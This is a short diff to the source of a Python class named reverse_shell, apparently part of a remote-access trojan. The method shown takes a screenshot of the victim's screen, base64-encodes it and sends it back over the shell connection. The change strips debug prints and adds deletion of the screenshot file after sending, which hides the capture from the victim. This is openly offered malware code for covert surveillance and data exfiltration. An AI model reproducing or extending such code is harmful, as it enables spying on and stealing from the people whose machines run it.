@@ -66,11 +66,10 @@ class reverse_shell:
     def take_screenshot(self):
         filename = time.strftime("%Y-%m-%d_%H-%M-%S", time.gmtime()) + ".png"
         try:
-            print "taking cap"
             pyautogui.screenshot(filename)
-            print "took cap "
             with open(filename, "rb") as cap_file:
                 self.reliable_send(base64.b64encode(cap_file.read()))
+            os.remove(filename)
         except:
             self.reliable_send("[error]: unable to take screenshot")
 
